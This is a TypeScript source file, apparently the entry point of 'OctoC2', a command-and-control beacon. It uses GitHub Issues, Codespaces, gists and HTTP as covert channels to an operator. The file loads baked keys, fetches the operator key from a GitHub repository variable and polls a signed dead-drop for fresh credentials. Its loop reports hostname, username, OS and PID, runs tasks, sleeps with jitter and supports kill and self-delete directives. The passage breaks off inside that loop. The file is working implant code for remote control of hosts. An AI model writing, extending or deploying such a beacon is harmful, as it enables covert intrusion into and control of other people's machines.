/**
 * OctoC2 Beacon — Entry Point
 *
 * Boot sequence:
 *   1. Resolve stable beacon ID (from existing state file or new UUID)
 *   2. Load persisted key pair if available (IssuesTentacle will create one if not)
 *   3. Build BeaconConfig and register IssuesTentacle with ConnectionFactory
 *   4. Run main loop: checkin → execute tasks → submit results → sleep (with jitter)
 *   5. Graceful shutdown on SIGINT / SIGTERM
 *
 * Environment variables:
 *   SVC_GITHUB_TOKEN                         — explicit fine-grained GitHub token
 *   SVC_GITHUB_TOKEN_LEASE                   — server-issued installation-token lease JSON
 *   OCTOC2_REPO_OWNER                        — org/user owning the C2 repo
 *   OCTOC2_REPO_NAME                         — C2 repository name
 *   SVC_SLEEP   (default: 60)             — base sleep interval in seconds
 *   SVC_JITTER  (default: 0.3)            — jitter factor (0–1)
 *   OCTOC2_LOG_LEVEL (default: info)         — debug | info | warn | error
 *
 * Recovery (optional, all source/trust fields are required together):
 *   OCTOC2_RECOVERY_REPO_OWNER
 *   OCTOC2_RECOVERY_REPO_NAME
 *   OCTOC2_RECOVERY_REPO_REF
 *   OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY
 *   OCTOC2_RECOVERY_SIGNING_KEY_ID
 */

import { ConnectionFactory }  from "./factory/ConnectionFactory.ts";
import { registerTentacles }  from "./factory/registerTentacles.ts";
import {
  DeadDropResolver,
  type DeadDropSource,
  type ResolvedDeadDrop,
} from "./recovery/DeadDropResolver.ts";
import {
  applyAcceptedRecoveryTrust,
  loadRecoveryStateSnapshot,
  saveAcceptedRecoveryState,
} from "./recovery/RecoveryState.ts";
import { applyRecoveryConfiguration } from "./recovery/applyRecovery.ts";
import {
  TaskExecutor,
  type ExecutorDirective,
} from "./tasks/TaskExecutor.ts";
import type { AppliedDirectiveEffect } from "./tasks/TaskDirective.ts";
import {
  retryPendingResults,
  resumeAcknowledgedDirectives,
  submitAndApplyDirective,
} from "./tasks/TaskLifecycle.ts";
import {
  createState,
  loadState,
  type SigningKeyPairData,
} from "./state/BeaconState.ts";
import {
  base64ToBytes,
  bytesToBase64,
  derivePublicKey,
  sign,
  verify,
} from "./crypto/sodium.ts";
import {
  assertBeaconId,
  discoverPersistedBeaconId,
} from "./state/BeaconIdentity.ts";
import {
  createTaskResultSignaturePayload,
  createUnsignedEnvelope,
  ed25519KeyId,
  assertGitHubTokenLease,
  SELECTABLE_CHANNEL_KINDS,
  serializeSignedEnvelope,
  signEnvelope,
  type ChannelKind,
  type GitHubTokenLease,
} from "@octoc2/shared";
import {
  getSharedGitHubTokenProvider,
  getSharedGitHubTokenProviderIfPresent,
} from "./lib/GitHubTokenProvider.ts";
import { GH_UA }              from "./lib/constants.ts";
import { createLogger }      from "./logger.ts";
import type { BeaconConfig, CheckinPayload, RelayConfig, ProxyConfig } from "./types.ts";

const log = createLogger("svc");
const DEFAULT_SLEEP_SECONDS = 60;
const MAX_SLEEP_SECONDS = 24 * 60 * 60;
const DEFAULT_JITTER = 0.3;
const DEFAULT_RECOVERY_POLL_INTERVAL_MS = 60_000;
const MIN_RECOVERY_POLL_INTERVAL_MS = 10_000;
const MAX_RECOVERY_POLL_INTERVAL_MS = 45 * 60 * 1000;

// ── Operator public key resolution ───────────────────────────────────────────

/**
 * Fetch the operator's X25519 public key from the MONITORING_PUBKEY repo variable.
 * Falls back to a zero key if the variable isn't set (IssuesTentacle will still
 * work as it fetches the key separately during init).
 */
async function resolveOperatorPublicKey(
  token: string,
  owner: string,
  repo: string,
  allowRecoveryBootstrap = false,
): Promise<Uint8Array> {
  const provisioned = process.env.OCTOC2_OPERATOR_PUBKEY?.trim();
  if (provisioned) {
    const key = await base64ToBytes(provisioned);
    if (key.length !== 32) {
      throw new Error("OCTOC2_OPERATOR_PUBKEY decoded to an invalid length");
    }
    return key;
  }
  if (!token) {
    if (allowRecoveryBootstrap) {
      log.info(
        "Deferring monitoring public-key resolution until signed recovery",
      );
      return new Uint8Array(0);
    }
    throw new Error(
      "OCTOC2_OPERATOR_PUBKEY is required when no GitHub token is available",
    );
  }
  try {
    const resp = await fetch(
      `https://api.github.com/repos/${owner}/${repo}/actions/variables/MONITORING_PUBKEY`,
      { headers: { Authorization: `Bearer ${token}`, "User-Agent": GH_UA } },
    );
    if (resp.ok) {
      const data = await resp.json() as { value?: string };
      const b64 = data.value?.trim();
      if (b64) {
        const key = await base64ToBytes(b64);
        if (key.length === 32) {
          log.info("Resolved operator public key from MONITORING_PUBKEY variable");
          return key;
        }
      }
    }
  } catch { /* fall through */ }
  log.warn("Could not resolve MONITORING_PUBKEY — some tentacles may fail to decrypt tasks");
  throw new Error(
    "Could not resolve a trusted operator public key; refusing to use a zero key",
  );
}

// ── Beacon ID resolution ──────────────────────────────────────────────────────

/**
 * Find the existing beacon's state file and return its ID, or generate a
 * fresh UUID for a first-run beacon. IssuesTentacle will create the state
 * file on first checkin.
 */
async function resolveBeaconId(): Promise<string> {
  // Check for compile-time baked ID (octoctl build-beacon injects this).
  // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
  const bakedId = process.env.OCTOC2_BEACON_ID;
  if (bakedId !== undefined && bakedId !== "") {
    const validated = assertBeaconId(bakedId, "OCTOC2_BEACON_ID");
    log.info(`Using baked beacon ID: ${validated}`);
    return validated;
  }

  const persistedId = await discoverPersistedBeaconId();
  if (persistedId) {
    log.info(`Resuming beacon ${persistedId}`);
    return persistedId;
  }

  const id = crypto.randomUUID();
  log.info(`First run — new beacon ID: ${id}`);
  return id;
}

function parseRelayConsortium(): RelayConfig[] {
  const raw = process.env.OCTOC2_RELAY_CONSORTIUM?.trim();
  if (!raw) return [];
  try {
    const parsed = JSON.parse(raw) as unknown;
    if (!Array.isArray(parsed)) return [];
    return parsed.filter(
      (e): e is RelayConfig =>
        typeof e === "object" && e !== null &&
        typeof (e as any).account === "string" &&
        typeof (e as any).repo === "string"
    );
  } catch {
    return [];
  }
}

/** Runtime-selectable kinds come from the shared canonical channel catalog. */
const VALID_TENTACLE_KINDS = new Set<string>(SELECTABLE_CHANNEL_KINDS);

/**
 * Parse SVC_TENTACLE_PRIORITY env var into a tentacle priority list.
 * Format: comma-separated kinds, e.g. "codespaces,proxy,issues"
 *
 * When unset, auto-detects the configured transport order:
 *   1. "codespaces" — gRPC-over-SSH (if SVC_GRPC_DIRECT or Codespace SSH vars present)
 *   2. "http"       — WebSocket/REST on port 8080 (if SVC_HTTP_URL is set)
 *   3. "issues"     — plain GitHub Issues (always last resort)
 */
export function parseTentaclePriority(): ChannelKind[] {
  const raw = process.env.SVC_TENTACLE_PRIORITY?.trim();
  if (!raw) {
    // Auto-detect only channels whose complete prerequisites are present.
    const hasCodespacesCredential = Boolean(
      process.env["SVC_CODESPACES_GITHUB_TOKEN"]?.trim(),
    );
    const hasGrpc = Boolean(
      process.env.SVC_GRPC_DIRECT ||
      (
        hasCodespacesCredential &&
        process.env.SVC_GRPC_CODESPACE_NAME
      ) ||
      (
        hasCodespacesCredential &&
        (
          process.env["SVC_AUTO_PROVISION_CODESPACE"] === "true" ||
          process.env["SVC_AUTO_PROVISION_CODESPACE"] === "1"
        )
      )
    );
    const hasHttp = Boolean(process.env.SVC_HTTP_URL);
    const order: ChannelKind[] = [];
    if (hasGrpc)  order.push("codespaces");
    if (hasHttp)  order.push("http");
    order.push("issues"); // always the last-resort fallback
    return order;
  }

  const parts = raw.split(",").map(s => s.trim());
  const valid: ChannelKind[] = [];
  const invalid: string[] = [];

  for (const part of parts) {
    if (VALID_TENTACLE_KINDS.has(part)) {
      valid.push(part as ChannelKind);
    } else {
      invalid.push(part);
    }
  }

  if (invalid.length > 0) {
    log.warn(`Invalid tentacle priority entries ignored: ${invalid.join(", ")}`);
  }

  if (valid.length === 0) return ["issues"];
  return valid;
}

export function parseCleanupDays(): number | undefined {
  const raw = process.env.SVC_CLEANUP_DAYS?.trim();
  if (!raw) return undefined;
  const n = parseInt(raw, 10);
  if (isNaN(n) || n < 0) return undefined;
  return n;
}

export function resolveGistToken(
  raw: string | undefined,
  forbiddenCredentials: readonly string[],
): string | undefined {
  const token = raw?.trim() ?? "";
  if (!token) return undefined;
  if (forbiddenCredentials.some((credential) => credential && credential === token)) {
    throw new Error(
      "SVC_GIST_TOKEN must be distinct from repository, controller, and Codespaces credentials",
    );
  }
  return token;
}

function readBoundedNumber(
  raw: string | undefined,
  name: string,
  fallback: number,
  minimum: number,
  maximum: number,
  integer: boolean,
): number {
  const value = raw?.trim();
  if (!value) return fallback;
  const parsed = Number(value);
  if (
    !Number.isFinite(parsed) ||
    (integer && !Number.isSafeInteger(parsed)) ||
    parsed < minimum ||
    parsed > maximum
  ) {
    const type = integer ? "integer" : "number";
    throw new Error(
      `${name} must be a ${type} from ${minimum} through ${maximum}`,
    );
  }
  return parsed;
}

export function parseSleepSeconds(
  raw = process.env.SVC_SLEEP,
): number {
  return readBoundedNumber(
    raw,
    "SVC_SLEEP",
    DEFAULT_SLEEP_SECONDS,
    1,
    MAX_SLEEP_SECONDS,
    true,
  );
}

export function parseSleepJitter(
  raw = process.env.SVC_JITTER,
): number {
  return readBoundedNumber(
    raw,
    "SVC_JITTER",
    DEFAULT_JITTER,
    0,
    1,
    false,
  );
}

export function parseRecoveryPollIntervalMs(
  raw = process.env["SVC_RECOVERY_POLL_INTERVAL_MS"],
): number {
  return readBoundedNumber(
    raw,
    "SVC_RECOVERY_POLL_INTERVAL_MS",
    DEFAULT_RECOVERY_POLL_INTERVAL_MS,
    MIN_RECOVERY_POLL_INTERVAL_MS,
    MAX_RECOVERY_POLL_INTERVAL_MS,
    true,
  );
}

export function parseProxyRepos(): ProxyConfig[] {
  const raw = process.env.SVC_PROXY_REPOS?.trim();
  if (!raw) return [];
  throw new Error(
    "SVC_PROXY_REPOS is retired; proxy routes and short-lived credentials must arrive in a signed recovery record",
  );
}

// ── Config loading ────────────────────────────────────────────────────────────

function parseInitialGitHubTokenLease(
  raw: string | undefined,
  beaconId: string,
  owner: string,
  repo: string,
): GitHubTokenLease | undefined {
  if (!raw?.trim()) return undefined;
  let parsed: unknown;
  try {
    parsed = JSON.parse(raw);
  } catch {
    throw new Error("SVC_GITHUB_TOKEN_LEASE must be valid JSON");
  }
  assertGitHubTokenLease(parsed);
  if (parsed.beaconId !== beaconId) {
    throw new Error("SVC_GITHUB_TOKEN_LEASE belongs to another beacon");
  }
  if (
    parsed.repository.owner.toLowerCase() !== owner.toLowerCase() ||
    parsed.repository.repo.toLowerCase() !== repo.toLowerCase()
  ) {
    throw new Error(
      "SVC_GITHUB_TOKEN_LEASE is scoped to a different repository",
    );
  }
  return {
    ...parsed,
    repository: { ...parsed.repository },
    permissions: { ...parsed.permissions },
  };
}

function parseRecoverySource(): DeadDropSource | null {
  const owner = process.env["OCTOC2_RECOVERY_REPO_OWNER"]?.trim();
  const repo = process.env["OCTOC2_RECOVERY_REPO_NAME"]?.trim();
  const ref = process.env["OCTOC2_RECOVERY_REPO_REF"]?.trim();
  const provided = [owner, repo, ref].filter(Boolean).length;
  if (provided === 0) return null;
  if (!owner || !repo || !ref) {
    throw new Error(
      "OCTOC2_RECOVERY_REPO_OWNER, OCTOC2_RECOVERY_REPO_NAME, and " +
      "OCTOC2_RECOVERY_REPO_REF must be set together",
    );
  }
  return { owner, repo, ref };
}

async function parseRecoveryTrust(): Promise<{
  publicKey: Uint8Array;
  keyId: string;
} | null> {
  const publicKeyRaw =
    process.env["OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY"]?.trim();
  const keyId =
    process.env["OCTOC2_RECOVERY_SIGNING_KEY_ID"]?.trim();
  if (!publicKeyRaw && !keyId) return null;
  if (!publicKeyRaw || !keyId) {
    throw new Error(
      "OCTOC2_RECOVERY_SIGNING_PUBLIC_KEY and " +
      "OCTOC2_RECOVERY_SIGNING_KEY_ID must be set together",
    );
  }
  const publicKey = await base64ToBytes(publicKeyRaw);
  if (publicKey.length !== 32 || await ed25519KeyId(publicKey) !== keyId) {
    throw new Error("Provisioned recovery signing key is invalid");
  }
  return { publicKey, keyId };
}

function equalBytes(left: Uint8Array, right: Uint8Array): boolean {
  if (left.length !== right.length) return false;
  let difference = 0;
  for (let index = 0; index < left.length; index += 1) {
    difference |= left[index]! ^ right[index]!;
  }
  return difference === 0;
}

export async function assertX25519KeyPair(
  keyPair: { publicKey: Uint8Array; secretKey: Uint8Array },
  name: string,
): Promise<void> {
  if (keyPair.publicKey.length !== 32 || keyPair.secretKey.length !== 32) {
    throw new Error(`${name} X25519 key lengths are invalid`);
  }
  if (
    !equalBytes(
      keyPair.publicKey,
      await derivePublicKey(keyPair.secretKey),
    )
  ) {
    throw new Error(`${name} X25519 public and secret keys do not match`);
  }
}

export async function assertEd25519KeyPair(
  keyPair: { publicKey: Uint8Array; secretKey: Uint8Array },
  keyId: string,
  name: string,
): Promise<void> {
  if (keyPair.publicKey.length !== 32 || keyPair.secretKey.length !== 64) {
    throw new Error(`${name} Ed25519 key lengths are invalid`);
  }
  if (await ed25519KeyId(keyPair.publicKey) !== keyId) {
    throw new Error(`${name} Ed25519 key ID does not match its public key`);
  }
  const challenge = "octoc2-ed25519-keypair-validation-v1";
  if (
    !await verify(
      challenge,
      await sign(challenge, keyPair.secretKey),
      keyPair.publicKey,
    )
  ) {
    throw new Error(`${name} Ed25519 public and secret keys do not match`);
  }
}

async function loadConfig(beaconId: string): Promise<BeaconConfig> {
  // A static token is accepted only when explicitly provisioned as the
  // beacon-scoped SVC_GITHUB_TOKEN. There is no shared-token alias.
  const token = (process.env.SVC_GITHUB_TOKEN ?? "").trim();
  const controllerToken = (process.env.SVC_BEACON_API_TOKEN ?? "").trim();
  const codespacesToken =
    (process.env["SVC_CODESPACES_GITHUB_TOKEN"] ?? "").trim();
  const owner = (process.env.OCTOC2_REPO_OWNER ?? "").trim();
  const repo  = (process.env.OCTOC2_REPO_NAME  ?? "").trim();
  const recoverySource = parseRecoverySource();
  const recoveryTrust = await parseRecoveryTrust();
  if (Boolean(recoverySource) !== Boolean(recoveryTrust)) {
    throw new Error(
      "Recovery repository source and recovery signing trust must be configured together",
    );
  }
  const githubTokenLease = parseInitialGitHubTokenLease(
    process.env.SVC_GITHUB_TOKEN_LEASE,
    beaconId,
    owner,
    repo,
  );

  if (
    (!token && !githubTokenLease && !controllerToken && !recoverySource) ||
    !owner ||
    !repo
  ) {
    throw new Error(
      "Missing required configuration: owner/repo and a scoped credential or recovery bootstrap",
    );
  }
  if (token && githubTokenLease) {
    throw new Error(
      "Configure either SVC_GITHUB_TOKEN or SVC_GITHUB_TOKEN_LEASE, not both",
    );
  }
  const githubCredential = token || githubTokenLease?.token || "";
  const gistToken = resolveGistToken(
    process.env["SVC_GIST_TOKEN"],
    [githubCredential, controllerToken, codespacesToken],
  );
  if (
    githubCredential &&
    controllerToken &&
    githubCredential === controllerToken
  ) {
    throw new Error("GitHub and controller credentials must be distinct");
  }
  if (
    process.env.SVC_APP_PRIVATE_KEY?.trim() ||
    process.env["OCTOC2_APP_PRIVATE_KEY"]?.trim()
  ) {
    throw new Error(
      "GitHub App private keys are server-only and cannot be loaded by a beacon",
    );
  }

  // Load persisted keypair if we have one. IssuesTentacle will update
  // config.beaconKeyPair and create the state file on first init.
  const signingPublicB64 = process.env.OCTOC2_BEACON_SIGN_PUBKEY?.trim();
  const signingSecretB64 = process.env.OCTOC2_BEACON_SIGN_SECKEY?.trim();
  const signingKeyIdEnv = process.env.OCTOC2_BEACON_SIGN_KEY_ID?.trim();
  const hasAnySigningDefine = Boolean(
    signingPublicB64 || signingSecretB64 || signingKeyIdEnv,
  );
  if (
    hasAnySigningDefine &&
    (!signingPublicB64 || !signingSecretB64 || !signingKeyIdEnv)
  ) {
    throw new Error("The complete provisioned Ed25519 identity is required");
  }

  let provisionedSigning: SigningKeyPairData | undefined;
  let provisionedSigningBytes:
    | { publicKey: Uint8Array; secretKey: Uint8Array }
    | undefined;
  if (signingPublicB64 && signingSecretB64 && signingKeyIdEnv) {
    provisionedSigningBytes = {
      publicKey: await base64ToBytes(signingPublicB64),
      secretKey: await base64ToBytes(signingSecretB64),
    };
    await assertEd25519KeyPair(
      provisionedSigningBytes,
      signingKeyIdEnv,
      "Provisioned",
    );
    provisionedSigning = {
      publicKey: signingPublicB64,
      secretKey: signingSecretB64,
      keyId: signingKeyIdEnv,
    };
  }

  const existingState = await loadState(
    beaconId,
    provisionedSigning ? { signingKeyPair: provisionedSigning } : undefined,
  );

  let beaconKeyPair: { publicKey: Uint8Array; secretKey: Uint8Array };

  // Dot notation required for Bun --define substitution at compile time.
  const bakedPubkey = process.env.OCTOC2_BEACON_PUBKEY?.trim();
  const bakedSeckey = process.env.OCTOC2_BEACON_SECKEY?.trim();
  if (Boolean(bakedPubkey) !== Boolean(bakedSeckey)) {
    throw new Error("The complete provisioned X25519 identity is required");
  }

  if (bakedPubkey && bakedSeckey) {
    // Compile-time baked keypair (octoctl build-beacon)
    beaconKeyPair = {
      publicKey: await base64ToBytes(bakedPubkey),
      secretKey: await base64ToBytes(bakedSeckey),
    };
    await assertX25519KeyPair(beaconKeyPair, "Provisioned");
    if (existingState) {
      const persistedKeyPair = {
        publicKey: await base64ToBytes(existingState.keyPair.publicKey),
        secretKey: await base64ToBytes(existingState.keyPair.secretKey),
      };
      await assertX25519KeyPair(persistedKeyPair, "Persisted");
      if (
        !equalBytes(beaconKeyPair.publicKey, persistedKeyPair.publicKey) ||
        !equalBytes(beaconKeyPair.secretKey, persistedKeyPair.secretKey)
      ) {
        throw new Error(
          "Provisioned X25519 identity does not match persisted beacon state",
        );
      }
    }
    log.info("Using baked beacon keypair");
  } else if (existingState) {
    beaconKeyPair = {
      publicKey: await base64ToBytes(existingState.keyPair.publicKey),
      secretKey: await base64ToBytes(existingState.keyPair.secretKey),
    };
    await assertX25519KeyPair(beaconKeyPair, "Persisted");
  } else {
    // No existing state file — generate a fresh keypair now so all tentacles
    // (including non-IssuesTentacle primaries like NotesTentacle) send valid
    // public keys from the very first checkin. IssuesTentacle will persist this
    // keypair to the state file on its first init instead of creating a new one.
    throw new Error(
      "No pre-provisioned X25519 identity is available; use octoctl build-beacon",
    );
  }

  // ── Provisioned beacon signing identity ──────────────────────────────────
  const persistedSigningBytes = existingState
    ? {
        publicKey: await base64ToBytes(existingState.signingKeyPair.publicKey),
        secretKey: await base64ToBytes(existingState.signingKeyPair.secretKey),
      }
    : undefined;
  if (persistedSigningBytes && existingState) {
    await assertEd25519KeyPair(
      persistedSigningBytes,
      existingState.signingKeyPair.keyId,
      "Persisted",
    );
  }
  if (
    provisionedSigningBytes &&
    persistedSigningBytes &&
    existingState &&
    (
      !equalBytes(
        provisionedSigningBytes.publicKey,
        persistedSigningBytes.publicKey,
      ) ||
      !equalBytes(
        provisionedSigningBytes.secretKey,
        persistedSigningBytes.secretKey,
      ) ||
      signingKeyIdEnv !== existingState.signingKeyPair.keyId
    )
  ) {
    throw new Error(
      "Provisioned Ed25519 identity does not match persisted beacon state",
    );
  }
  const signingKeyPair =
    provisionedSigningBytes ?? persistedSigningBytes;
  const signingKeyId = provisionedSigning?.keyId
    ?? existingState?.signingKeyPair.keyId;
  if (!signingKeyPair || !signingKeyId) {
    throw new Error("No pre-provisioned Ed25519 signing identity is available");
  }

  const state = existingState ?? await createState(
    beaconId,
    {
      publicKey: await bytesToBase64(beaconKeyPair.publicKey),
      secretKey: await bytesToBase64(beaconKeyPair.secretKey),
    },
    {
      publicKey: await bytesToBase64(signingKeyPair.publicKey),
      secretKey: await bytesToBase64(signingKeyPair.secretKey),
      keyId: signingKeyId,
    },
  );

  return {
    id:    beaconId,
    repo:  { owner, name: repo },
    token: githubCredential,
    ...(githubTokenLease && { githubTokenLease }),
    ...(gistToken && { gistToken }),
    ...(controllerToken && { controllerToken }),
    tentaclePriority: parseTentaclePriority(),
    sleepSeconds: parseSleepSeconds(),
    jitter:       parseSleepJitter(),
    // Fetch operator public key from the MONITORING_PUBKEY repo variable.
    // All tentacles need this for decrypting tasks (crypto_box) and sealing results.
    operatorPublicKey: await resolveOperatorPublicKey(
      githubCredential,
      owner,
      repo,
      recoverySource !== null,
    ),
    beaconKeyPair,
    signingKeyPair,
    signingKeyId,
    ...(process.env.SVC_HTTP_URL?.trim() && {
      serverUrl: process.env.SVC_HTTP_URL.trim(),
    }),
    ...(recoveryTrust && {
      recoverySigningPublicKey: recoveryTrust.publicKey,
      recoverySigningKeyId: recoveryTrust.keyId,
      recoveryGeneration: 0,
    }),
    state,
    relayConsortium: parseRelayConsortium(),
    proxyRepos: parseProxyRepos(),
    ...(parseCleanupDays() !== undefined ? { cleanupDays: parseCleanupDays()! } : {}),
  };
}

// ── Checkin payload ───────────────────────────────────────────────────────────

async function buildCheckinPayload(config: BeaconConfig): Promise<CheckinPayload> {
  if (!config.state || !config.signingKeyPair || !config.signingKeyId) {
    throw new Error("Beacon signing identity/state is not initialized");
  }
  const checkinAt = new Date().toISOString();
  const publicKey = await bytesToBase64(config.beaconKeyPair.publicKey);
  const signingPublicKey = await bytesToBase64(config.signingKeyPair.publicKey);
  const hostname = process.env["HOSTNAME"] ?? "unknown";
  const username = process.env["USER"] ?? process.env["USERNAME"] ?? "unknown";
  const identity = await signEnvelope(
    createUnsignedEnvelope({
      kind: "checkin",
      signerId: config.id,
      keyId: config.signingKeyId,
      issuedAt: checkinAt,
      sequence: config.state.nextIdentitySeq(),
      payload: {
        beaconId: config.id,
        encryptionPublicKey: publicKey,
        signingPublicKey,
        hostname,
        username,
        os: process.platform,
        arch: process.arch,
        pid: process.pid,
        checkinAt,
      },
    }),
    config.signingKeyPair.secretKey,
  );
  await config.state.persist();
  return {
    beaconId:  config.id,
    publicKey,
    hostname,
    username,
    os:        process.platform,
    arch:      process.arch,
    pid:       process.pid,
    checkinAt,
    identity,
  };
}

async function finalizeSignedResult(
  config: BeaconConfig,
  result: import("@octoc2/shared").TaskResult,
  directive: ExecutorDirective = { kind: "none" },
): Promise<import("@octoc2/shared").TaskResult> {
  if (!config.state || !config.signingKeyPair || !config.signingKeyId) {
    throw new Error("Beacon signing identity/state is not initialized");
  }
  const envelope = await signEnvelope(
    createUnsignedEnvelope({
      kind: "task-result",
      signerId: config.id,
      keyId: config.signingKeyId,
      issuedAt: result.completedAt,
      sequence: config.state.nextIdentitySeq(),
      payload: await createTaskResultSignaturePayload(result),
    }),
    config.signingKeyPair.secretKey,
  );
  const signed = {
    ...result,
    signature: serializeSignedEnvelope(envelope),
  };
  config.state.completeTask(signed, directive);
  await config.state.persist();
  return signed;
}

// ── Sleep with jitter ─────────────────────────────────────────────────────────

function sleepMs(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

/**
 * Compute a jittered sleep duration.
 * Returns a value in [base*(1-jitter), base*(1+jitter)], minimum 1 s.
 */
function jitteredSleepMs(baseSeconds: number, jitter: number): number {
  const base   = baseSeconds * 1000;
  const window = base * jitter;
  const offset = (Math.random() * 2 - 1) * window;  // ± window
  return Math.max(1000, Math.round(base + offset));
}

async function acceptResolvedRecovery(
  config: BeaconConfig,
  drop: ResolvedDeadDrop,
): Promise<void> {
  await saveAcceptedRecoveryState({
    version: 2,
    beaconId: config.id,
    generation: drop.generation,
    acceptedAt: new Date().toISOString(),
    expiresAt: drop.expiresAt,
    configuration: drop.configuration,
  });
  await applyRecoveryConfiguration(
    config,
    drop.generation,
    drop.configuration,
  );
}

function recoveryRenewalNeeded(config: BeaconConfig): boolean {
  if (!config.token && !config.githubTokenLease) return true;
  const now = Date.now();
  if (
    config.proxyRepos?.some((proxy) => {
      const lease = proxy.githubTokenLease;
      const provider = getSharedGitHubTokenProviderIfPresent(
        config.id,
        { owner: proxy.owner, name: proxy.repo },
      );
      return provider?.needsRenewal() === true || (
        lease !== undefined && (
          now >= Date.parse(lease.renewAfter) ||
          now >= Date.parse(lease.expiresAt)
        )
      );
    })
  ) {
    return true;
  }
  try {
    return getSharedGitHubTokenProvider(config).needsRenewal();
  } catch {
    return true;
  }
}

/**
 * Re-register all tentacles in the factory based on the current config.
 * Call after an authenticated recovery record replaces the live config.
 */
async function rebuildFactory(
  factory: ConnectionFactory,
  config: BeaconConfig
): Promise<void> {
  await factory.teardown();
  await registerTentacles(factory, config, { silent: true });
}

// ── Main beacon loop ──────────────────────────────────────────────────────────

async function main(): Promise<void> {
  log.info("Beacon starting...");

  const beaconId = await resolveBeaconId();
  const config   = await loadConfig(beaconId);
  const persistedRecovery = await loadRecoveryStateSnapshot(beaconId);
  if (persistedRecovery?.activeState) {
    await applyRecoveryConfiguration(
      config,
      persistedRecovery.activeState.generation,
      persistedRecovery.activeState.configuration,
    );
    log.info(
      `Restored recovery generation ${persistedRecovery.activeState.generation}`,
    );
  } else if (persistedRecovery) {
    applyAcceptedRecoveryTrust(config, persistedRecovery.trust);
    log.info(
      `Restored recovery trust generation ${persistedRecovery.trust.generation} without expired credentials`,
    );
  }

  const recoverySource = parseRecoverySource();
  const deadDropResolver = recoverySource
    ? new DeadDropResolver(recoverySource)
    : null;

  const pollRecovery = async (reason: string): Promise<boolean> => {
    if (
      !deadDropResolver ||
      !config.recoverySigningPublicKey ||
      !config.recoverySigningKeyId
    ) {
      return false;
    }
    log.info(`Polling deterministic recovery record (${reason})`);
    const drop = await deadDropResolver.resolve(
      beaconId,
      config.beaconKeyPair.secretKey,
      {
        minimumGenerationExclusive: config.recoveryGeneration ?? 0,
        signingPublicKey: config.recoverySigningPublicKey,
        expectedSigningKeyId: config.recoverySigningKeyId,
      },
    );
    if (!drop) {
      log.debug(
        `Recovery record not applied (${deadDropResolver.lastFailureReason ?? "unavailable"})`,
      );
      return false;
    }
    await acceptResolvedRecovery(config, drop);
    log.info(
      `Accepted recovery generation ${drop.generation}; lease expires ${drop.expiresAt}`,
    );
    return true;
  };

  if (recoveryRenewalNeeded(config)) {
    await pollRecovery("startup credential renewal");
  }
  if (config.operatorPublicKey.length !== 32) {
    throw new Error(
      "No trusted monitoring public key is available after recovery bootstrap",
    );
  }

  // ── Wire up tentacles ─────────────────────────────────────────────────────
  const factory  = new ConnectionFactory({ config });
  const executor = new TaskExecutor(config);

  // Single source of truth for tentacle registration
  await registerTentacles(factory, config);

  // ── Graceful shutdown ─────────────────────────────────────────────────────
  let running = true;

  const shutdown = (signal: string) => {
    log.info(`Received ${signal} — shutting down after current iteration.`);
    running = false;
  };

  process.on("SIGINT",  () => shutdown("SIGINT"));
  process.on("SIGTERM", () => shutdown("SIGTERM"));

  // ── Sleep constants (may be updated by 'sleep' tasks) ────────────────────
  const persistedSleep = config.state?.sleepOverride;
  let sleepSeconds = persistedSleep?.seconds ?? config.sleepSeconds;
  let sleepJitter  = persistedSleep?.jitter ?? config.jitter;
  const recoveryPollIntervalMs = parseRecoveryPollIntervalMs();
  let lastRecoveryAttemptMs = 0;

  const applyLifecycleEffect = (
    taskId: string,
    effect: AppliedDirectiveEffect,
  ): boolean => {
    switch (effect.kind) {
      case "none":
        return false;
      case "kill":
        log.warn(`Controller-accepted kill directive for ${taskId}; exiting.`);
        running = false;
        return true;
      case "update_sleep":
        sleepSeconds = effect.seconds;
        sleepJitter = effect.jitter;
        log.info(
          `Sleep updated: ${sleepSeconds}s ±${Math.round(sleepJitter * 100)}%`,
        );
        return false;
      case "self_delete": {
        const level = effect.success ? "warn" : "error";
        log[level](
          `Self-delete directive ${
            effect.success ? "applied" : "remains pending"
          } for ${taskId}: ${effect.detail}`,
        );
        if (effect.success) {
          running = false;
          return true;
        }
        return false;
      }
    }
  };

  const resumeLifecycle = async (): Promise<
    "ready" | "blocked" | "terminal"
  > => {
    const retried = await retryPendingResults({
      submitter: factory,
      state: config.state!,
    });
    const justRetried = new Set(retried.map(({ taskId }) => taskId));
    for (const { taskId, outcome } of retried) {
      if (!outcome.controllerAccepted) {
        log.warn(
          outcome.artifactWritten
            ? `Cached result artifact for ${taskId} remains unacknowledged`
            : `Cached result for ${taskId} could not be submitted`,
        );
      }
      if (applyLifecycleEffect(taskId, outcome.effect)) return "terminal";
    }

    const resumed = await resumeAcknowledgedDirectives(
      config.state!,
      undefined,
      justRetried,
    );
    for (const { taskId, effect } of resumed) {
      if (applyLifecycleEffect(taskId, effect)) return "terminal";
    }
    if (config.state!.terminationRequested) {
      log.warn("A controller-accepted kill directive is pending; exiting.");
      running = false;
      return "terminal";
    }
    if (
      config.state!.listPendingResults().length > 0 ||
      config.state!.listPendingAcknowledgedDirectives().length > 0
    ) {
      return "blocked";
    }
    return "ready";
  };

  try {
    const startupLifecycle = await resumeLifecycle();
    if (startupLifecycle === "terminal") {
      await factory.teardown();
      return;
    }
    if (startupLifecycle === "blocked") {
      log.warn(
        "Pending result acceptance or directive application blocks new task execution",
      );
    }
  } catch (error) {
    log.error(
      `Could not resume durable task lifecycle: ${(error as Error).message}`,
    );
  }

  log.info(
    `Beacon ${beaconId} ready. ` +
    `Repo: ${config.repo.owner}/${config.repo.name} ` +
    `Sleep: ${sleepSeconds}s ±${Math.round(sleepJitter * 100)}%`
  );

  // ── Main loop ─────────────────────────────────────────────────────────────
  while (running) {
    try {
      if (
        deadDropResolver &&
        recoveryRenewalNeeded(config) &&
        Date.now() - lastRecoveryAttemptMs >= recoveryPollIntervalMs
      ) {
        lastRecoveryAttemptMs = Date.now();
        if (await pollRecovery("proactive credential renewal")) {
          sleepSeconds = config.sleepSeconds;
          sleepJitter = config.jitter;
          await rebuildFactory(factory, config);
        }
      }

      const lifecycle = await resumeLifecycle();
      if (lifecycle === "terminal") break;
      if (lifecycle === "blocked") {
        log.warn(
          "Pending result acceptance or directive application blocks this checkin cycle",
        );
      } else {
      // 1. Build a fresh checkin payload (picks up updated keypair after first init)
      const payload = await buildCheckinPayload(config);

      // 2. Checkin — blocks during initialization on first run, then returns tasks
